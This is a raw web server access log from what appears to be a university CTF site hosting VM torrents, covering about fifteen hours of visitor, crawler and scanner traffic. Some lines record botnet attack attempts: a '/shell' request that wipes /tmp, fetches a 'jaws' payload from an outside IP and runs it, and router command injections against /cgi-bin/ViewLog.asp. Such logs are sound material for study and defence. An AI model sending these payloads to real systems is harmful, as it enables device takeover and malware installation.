60.217.75.70 - - [26/Sep/2022:15:54:37 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFF\xB8\xD9\x05\x14\xC1A\xA6U\x8A\xF71+=dP6h\x97\xDE\x05\xA9\x9C\x14\x18\xA2\x904Z3,\x5C\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
2.57.122.60 - - [26/Sep/2022:16:00:19 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
2.57.122.60 - - [26/Sep/2022:16:00:19 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
2.57.122.60 - - [26/Sep/2022:16:00:19 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
2.57.122.60 - - [26/Sep/2022:16:00:19 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
176.59.108.246 - - [26/Sep/2022:16:02:43 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Linux; Android 10; MAR-LX1H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
176.59.108.246 - - [26/Sep/2022:16:02:44 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Linux; Android 10; MAR-LX1H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
85.26.232.221 - - [26/Sep/2022:16:04:03 +0300] "GET /torrents/ HTTP/1.1" 304 0 "http://away.vk.com/" "Mozilla/5.0 (Linux; arm_64; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.2.90.00 SA/3 Mobile Safari/537.36"
85.26.232.221 - - [26/Sep/2022:16:04:04 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Linux; arm_64; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.2.90.00 SA/3 Mobile Safari/537.36"
217.118.90.222 - - [26/Sep/2022:16:08:32 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36"
217.118.90.222 - - [26/Sep/2022:16:08:32 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36"
23.251.102.74 - - [26/Sep/2022:16:10:40 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
5.181.80.185 - - [26/Sep/2022:16:28:32 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
5.181.80.185 - - [26/Sep/2022:16:28:32 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
176.59.111.220 - - [26/Sep/2022:16:33:06 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Linux; arm; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.2.91.00 SA/3 Mobile Safari/537.36"
176.59.111.220 - - [26/Sep/2022:16:33:09 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Linux; arm; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.2.91.00 SA/3 Mobile Safari/537.36"
176.59.111.220 - - [26/Sep/2022:16:33:26 +0300] "GET /torrents/ HTTP/1.1" 304 0 "http://away.vk.com/" "Mozilla/5.0 (Linux; arm; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.2.91.00 SA/3 Mobile Safari/537.36"
5.45.207.109 - - [26/Sep/2022:16:35:02 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
85.140.5.229 - - [26/Sep/2022:16:51:05 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
46.208.158.102 - - [26/Sep/2022:16:59:11 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
46.208.158.102 - - [26/Sep/2022:16:59:11 +0300] "emoteSubmit=Save" 400 157 "-" "-"
80.95.44.209 - - [26/Sep/2022:17:02:53 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
80.95.44.209 - - [26/Sep/2022:17:02:53 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
80.95.44.209 - - [26/Sep/2022:17:03:39 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
80.95.44.209 - - [26/Sep/2022:17:03:46 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
37.113.50.101 - - [26/Sep/2022:17:08:27 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:08:27 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:08:29 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:11:12 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:12:33 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:13:13 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:14:24 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
80.95.44.209 - - [26/Sep/2022:17:15:57 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
37.113.50.101 - - [26/Sep/2022:17:16:00 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:17:09 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:18:36 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
37.113.50.101 - - [26/Sep/2022:17:20:23 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.16.221.34 - - [26/Sep/2022:17:25:52 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
172.16.221.34 - - [26/Sep/2022:17:25:52 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
172.16.221.34 - - [26/Sep/2022:17:26:05 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
43.131.66.209 - - [26/Sep/2022:17:29:02 +0300] "GET / HTTP/1.1" 200 3320 "-" "curl/7.64.1"
205.185.121.69 - - [26/Sep/2022:17:29:32 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.121.69 - - [26/Sep/2022:17:29:32 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
138.68.163.102 - - [26/Sep/2022:17:45:15 +0300] "\xE2\x13\xF0Lt\x15\xD0w}\xB6\xADk]'\x9F\xA5" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:17:45:15 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03+\xBD!,o\xE29\x10\xD3\xD3\xF0\x8EI\xED\xE8\xA6&.\xE9!\xC7v\xE7\xD6\x82\x9D4g\xF3u^\x91\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:17:45:15 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03h,B\x98B9\x0BZa0\xF1\xC5\xD1jff\x87\xD2Q\xBDl~{\xD8%\xAF|\xC5t\xE8%[\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:17:45:15 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
37.113.35.79 - - [26/Sep/2022:17:54:35 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.117 (Edition Yx GX)"
37.113.35.79 - - [26/Sep/2022:17:54:35 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.117 (Edition Yx GX)"
37.113.35.79 - - [26/Sep/2022:17:54:44 +0300] "GET /torrents/files/cos.torrent HTTP/1.1" 200 113612 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.117 (Edition Yx GX)"
37.113.35.79 - - [26/Sep/2022:17:55:20 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0"
37.113.35.79 - - [26/Sep/2022:17:55:20 +0300] "GET /favicon.png HTTP/1.1" 404 125 "-" "Mozilla/5.0"
37.113.35.79 - - [26/Sep/2022:17:55:20 +0300] "GET /favicon.gif HTTP/1.1" 404 125 "-" "Mozilla/5.0"
37.113.35.79 - - [26/Sep/2022:17:55:20 +0300] "GET /favicon.jpg HTTP/1.1" 404 125 "-" "Mozilla/5.0"
188.255.246.204 - - [26/Sep/2022:18:10:38 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
41.40.180.80 - - [26/Sep/2022:18:31:41 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws HTTP/1.1" 404 153 "-" "Hello, world"
192.241.206.209 - - [26/Sep/2022:19:19:20 +0300] "GET /manager/text/list HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
193.142.146.239 - - [26/Sep/2022:19:33:55 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
172.105.89.161 - - [26/Sep/2022:19:54:39 +0300] "\xBA\xABd\xA1EZC\xDBM\x87\xEE^\xFD\xBF\x159 X\xD4>\x12\x98\xC4<\xE0\x13\xCF\x00\xAC\xA09\xD7\x90#8~\x8C\xDE\x9DReF\xBF%1Q\xE0\x9D\x06&g\xBB\x82\x95\x19\xED\x07\x14\x19ZP\x80+\x94e\xC3\xE6\x85\x06\xA4\x99\x8B\x19l\x01\xEA\x88Y\x91\x16\x95\xC4\xC8\x0EH\x02\xC7\x93g\xC14FW\x05|\xFB\xF3T\xB8\xFD\xCB\xBB)\xE3\xCE\xDD\xCD7\x9E\xEFP\x8C\xA4[V\xFD\x98\xC9l\x82\xF5\xE4\xC1d\x87X\xF7\x9B\xBF\xE8q\x12\x99&\xDB,\xF5\x87\xD7\xA8\x97j;\xE3\xEA\xA7\xB4\xB0\x02\xAD\x8DE\x9B\xAAB\x80\x0E)\xA9\xE9\xAF}\x18\x8E\xB8\x1E\x99\x04\xEF\xA8\x8C\xE8\x04\xE2\xD3\xED)1\x91\xC1\x8F\x88\x8C\x81\xF0\xDB\xA5\x88\x95H\x9BZ\xAB\xCE\xBF\xF4E%P*\x88KFY6\x9E\xE7::j\xD4\x8A\xA8V\x9A\xAA\xAB\xAF\xC3&.\xED[\x04\xC5e\x7F\x08\xBE\x8Ar\xA7\xB0\x99F\xF7\x11\xE5\xD6\x96\x8CIm+w\x1C\xFDuU\x14\x0F!x\xAC\xE8MPy\xC3\x19!2\xA0\xED\xC0}!Rw\x14\x8E\x1B\xC4\xE1\xA0\xAF+\xADKk\xC5\xE0\x5Cs\x9C\xBD\xCB" 400 157 "-" "-"
93.124.123.111 - - [26/Sep/2022:20:24:36 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
193.118.53.210 - - [26/Sep/2022:20:38:42 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.210 - - [26/Sep/2022:20:38:42 +0300] "GET /webfig/ HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
80.94.92.231 - - [26/Sep/2022:20:45:28 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
172.104.138.223 - - [26/Sep/2022:21:03:02 +0300] "GET /fuN3 HTTP/1.0" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
34.76.96.55 - - [26/Sep/2022:21:09:32 +0300] "GET / HTTP/1.1" 200 1286 "-" "python-requests/2.28.1"
51.254.59.113 - - [26/Sep/2022:21:18:52 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
111.118.40.97 - - [26/Sep/2022:21:21:53 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
111.118.40.97 - - [26/Sep/2022:21:21:53 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
172.91.47.43 - - [26/Sep/2022:21:34:34 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
172.91.47.43 - - [26/Sep/2022:21:34:34 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
93.124.108.9 - - [26/Sep/2022:22:23:17 +0300] "GET / HTTP/1.0" 200 3320 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
137.25.54.5 - - [26/Sep/2022:23:06:48 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
137.25.54.5 - - [26/Sep/2022:23:06:48 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
106.75.171.61 - - [26/Sep/2022:23:40:34 +0300] "GET / HTTP/1.0" 200 3320 "-" "-"
106.75.171.61 - - [26/Sep/2022:23:40:34 +0300] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x81.\xCE\xF8\x85\xA2%S\xF1\xE7p\x8A|\xD2]\x8B\xE6\x7F\xD6\x15\xF7\x01 " 400 157 "-" "-"
106.75.171.61 - - [26/Sep/2022:23:40:35 +0300] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x98\xFB\xAF\xCDb\x15\xDE\xBA\xCD\xCB^\x7F\xFDr\xDA\xE5\x0F\xE6\x81\x04RS\xD6\x90\x9D\x9Dm;\x94S!\x92 \xF4\xAF\x87\x10\x11\x02\x7FjN\xE1\xD4l3\xCA*\xDFY\xA4\x94)y3\x86\xFDh" 400 157 "-" "-"
106.75.171.61 - - [26/Sep/2022:23:40:43 +0300] "USER anonymous" 400 157 "-" "-"
80.94.92.239 - - [26/Sep/2022:23:51:23 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
47.63.1.192 - - [26/Sep/2022:23:53:47 +0300] "CONNECT google.es:443 HTTP/1.1" 400 157 "-" "-"
103.27.238.234 - - [27/Sep/2022:00:16:21 +0300] "GET /wp-login.php HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
37.113.39.21 - - [27/Sep/2022:00:36:02 +0300] "GET /torrents/ HTTP/1.1" 200 734 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
37.113.39.21 - - [27/Sep/2022:00:36:03 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
37.113.39.21 - - [27/Sep/2022:00:36:08 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
37.113.39.21 - - [27/Sep/2022:00:36:20 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
37.113.39.21 - - [27/Sep/2022:00:36:30 +0300] "GET /torrents/files/bos03-Debian.ova.torrent HTTP/1.1" 200 117057 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
164.52.24.169 - - [27/Sep/2022:01:06:44 +0300] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\x9B\x12\xBE\x9B\xDD9\x98)\xFA\x8F\xD2#l]\xBDs^\x0C\xB39%\xC6\x02H\x0C\xC9\x97\xCE\x96@\xD2\xFE x*\xCF\xBE\xA3\xF6\x0Cz\xE7\xE4\x12\xB3yij\xD6s\xB3\x96\xDC\xC5B1\x92X\x949\xEC*G\x9B\x88\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 157 "-" "-"
164.52.24.169 - - [27/Sep/2022:01:06:44 +0300] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\xA9\x18T<\x17\xDF\xCA]\x85n8J\xCD\x112\xE8>mHs5\x8C2\xFA\xFFA^\xE1\xB8-\x0FU\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 157 "-" "-"
164.52.24.169 - - [27/Sep/2022:01:06:45 +0300] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\x0C\x1C\xA6*\xE2\xDEu\x1C\x1B}\xB9.Y\xD2\x1Af" 400 157 "-" "-"
164.52.24.169 - - [27/Sep/2022:01:06:47 +0300] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\xDA\xF6`\xC4\xB4\xD61\xCC\xCF\xD0R\xA7q\xB1VHAE\xD7\xED\x8F\xCB\x09K\xA1\x83\xF7\x0EC\xA0\x15+\x00\x00\x12\xC0" 400 157 "-" "-"
164.52.24.169 - - [27/Sep/2022:01:06:59 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
164.52.24.169 - - [27/Sep/2022:01:07:05 +0300] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
5.255.253.37 - - [27/Sep/2022:01:48:13 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "-" "Mozilla/5.0 (compatible; YandexUserproxy; robot; +http://yandex.com/bots)"
5.255.253.34 - - [27/Sep/2022:01:48:17 +0300] "GET /torrents/files/bos03-Debian.ova.torrent HTTP/1.1" 200 117057 "-" "Mozilla/5.0 (compatible; YandexUserproxy; robot; +http://yandex.com/bots)"
64.20.63.126 - - [27/Sep/2022:02:49:16 +0300] "GET /game/zhuce/index.php HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
51.254.59.113 - - [27/Sep/2022:03:13:38 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
80.94.92.239 - - [27/Sep/2022:03:28:17 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
74.108.124.79 - - [27/Sep/2022:04:28:50 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
74.108.124.79 - - [27/Sep/2022:04:28:50 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
138.68.163.102 - - [27/Sep/2022:04:42:14 +0300] "\xC2\xAEa\xE2[\xAF\xCC\xABC\xD7\x16\xD3w1\x81y" 400 157 "-" "-"
101.42.235.219 - - [27/Sep/2022:05:31:15 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+103.159.64.218/jaws;sh+/tmp/jaws HTTP/1.1" 404 153 "-" "Hello, world"
47.243.75.120 - - [27/Sep/2022:06:08:45 +0300] "test" 400 157 "-" "-"
